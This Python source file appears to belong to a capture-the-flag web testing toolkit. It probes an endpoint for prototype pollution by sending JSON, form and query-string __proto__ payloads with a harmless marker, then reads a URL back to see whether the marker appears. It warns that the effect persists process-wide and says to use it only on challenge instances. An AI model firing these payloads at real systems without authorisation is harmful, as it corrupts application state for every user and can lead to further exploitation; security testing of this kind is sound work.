#!/usr/bin/env python3
"""pp_probe.py — pollute-then-read-back matrix for web-prototype-pollution.

The class's probe is fixed: pollute ONE harmless property through the
merge point, then read it back through a path that should not have it.
This fires the three carriers — JSON `{"__proto__":{p:v}}`, form
`__proto__[p]=v`, and query-string `?__proto__[p]=v` — then re-reads
--readback (or the baseline URL) and grades: does the marker property
appear where it should not, or did the response change versus the
pre-pollution baseline? Either is a CANDIDATE with the verbatim excerpt.

Blast radius is real: pollution is global to the process. The marker is
harmless (`bmk7x=1`), but a confirmed pollute may persist until restart —
run this on a challenge instance, never a shared one.

    python3 tools/web/pp_probe.py --url http://h/api/profile --method POST \
        --body '{"name":"x"}' --readback http://h/api/me
    python3 tools/web/pp_probe.py --selftest
"""
from __future__ import annotations

import argparse
import json
import sys
import urllib.parse

import httpkit

_PROP, _VAL = "bmk7x", "1"


def _text(r):
    b = r.get("body", "")
    return b.decode("utf-8", "replace") if isinstance(b, bytes) else (b or "")


def _fire_pollute(args, carrier):
    hdrs = dict(args.get("headers") or {})
    url, body = args["url"], None
    if carrier == "json":
        doc = json.loads(args.get("body") or "{}")
        doc["__proto__"] = {_PROP: _VAL}
        body = json.dumps(doc)
        hdrs.setdefault("Content-Type", "application/json")
    elif carrier == "form":
        extra = urllib.parse.urlencode({f"__proto__[{_PROP}]": _VAL})
        body = (args.get("body") or "") + ("&" if args.get("body") else "") + extra
    elif carrier == "query":
        q = urllib.parse.urlparse(url)
        pairs = urllib.parse.parse_qsl(q.query, keep_blank_values=True)
        pairs.append((f"__proto__[{_PROP}]", _VAL))
        url = urllib.parse.urlunparse(q._replace(query=urllib.parse.urlencode(pairs)))
    return httpkit.request(url, method=args.get("method", "POST"),
                           headers=hdrs, body=body,
                           timeout=args.get("timeout", 15))


def probe(args) -> dict:
    read_url = args.get("readback") or args["url"]
    base = _text(httpkit.request(read_url, headers=args.get("headers"),
                                 timeout=args.get("timeout", 15)))
    out = {"pollute_url": args["url"], "read_url": read_url,
           "marker": f"{_PROP}={_VAL}", "baseline_len": len(base), "cases": []}
    cand = []
    for carrier in ("json", "form", "query"):
        _fire_pollute(args, carrier)
        body = _text(httpkit.request(read_url, headers=args.get("headers"),
                                     timeout=args.get("timeout", 15)))
        i = body.find(_PROP)
        rec = {"carrier": carrier, "readback_len": len(body),
               "marker_visible": i >= 0}
        if i >= 0:
            rec["excerpt"] = body[max(0, i - 40):i + len(_PROP) + 40]
            rec["landed"] = "marker-on-readback"
            cand.append(rec)
        elif body != base:
            rec["landed"] = "readback-changed"
            rec["note"] = ("response differs from baseline without the marker "
                           "echoing — a polluted fallback may have changed "
                           "behaviour; diff and confirm")
            cand.append(rec)
        out["cases"].append(rec)
    out["pollution_candidates"] = cand
    out["candidate_only"] = True
    out["blast_radius"] = ("a landed marker is global to the process — "
                           "subsequent requests inherit it until restart")
    if not cand:
        out["note"] = ("no carrier changed the readback — the merge rejects "
                       "reserved keys or nothing reads a fallback; record "
                       "the falsifier as observed")
    return out


def _selftest() -> int:
    import threading
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
    state = {"polluted": False}

    class App(BaseHTTPRequestHandler):
        def do_POST(self):
            n = int(self.headers.get("Content-Length", 0))
            raw = self.rfile.read(n).decode()
            if "__proto__" in raw:
                state["polluted"] = True
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"ok")

        def do_GET(self):
            q = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
            if any(k.startswith("__proto__") for k in q):
                state["polluted"] = True
            body = b'{"me":"x","bmk7x":"1"}' if state["polluted"] else b'{"me":"x"}'
            self.send_response(200)
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, *_a):
            pass

    srv = ThreadingHTTPServer(("127.0.0.1", 0), App)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    port = srv.server_address[1]
    out = probe({"url": f"http://127.0.0.1:{port}/profile", "method": "POST",
                 "body": '{"name":"x"}', "headers": {},
                 "readback": f"http://127.0.0.1:{port}/me", "timeout": 15})
    srv.shutdown()
    carriers = {c["carrier"] for c in out["pollution_candidates"]}
    assert "json" in carriers, out
    print("pp_probe selftest: ok")
    return 0


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0],
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--url", help="the merge/update endpoint")
    ap.add_argument("--method", default="POST", choices=["POST", "GET", "PUT", "PATCH"])
    ap.add_argument("--body", help="documented request body")
    ap.add_argument("--readback", help="URL that shows the polluted object")
    ap.add_argument("--headers", nargs="*")
    ap.add_argument("--timeout", type=float, default=15)
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args(argv)
    if args.selftest:
        return _selftest()
    if not args.url:
        ap.print_help()
        return 2
    a = vars(args) | {"headers": httpkit.parse_headers(args.headers)}
    httpkit.jprint(probe(a))
    return 0


if __name__ == "__main__":
    sys.exit(main())
